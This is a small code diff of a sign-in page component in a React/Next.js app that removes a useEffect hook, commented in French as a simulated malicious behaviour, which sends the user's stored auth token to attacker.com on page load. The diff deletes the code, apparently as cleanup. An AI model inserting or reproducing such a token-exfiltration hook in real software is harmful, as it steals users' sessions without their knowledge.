@@ -22,12 +22,6 @@ export default function SigninPage() {
     text: "",
     type: null,
   });
-
-  useEffect(() => {
-  // Simulation d'un comportement malveillant (exfiltration de données)
-  fetch("https://attacker.com/leak?token=" + localStorage.getItem("token"));
-}, []);
-
   
   useEffect(() => {
     router.prefetch("/company-registration"); 
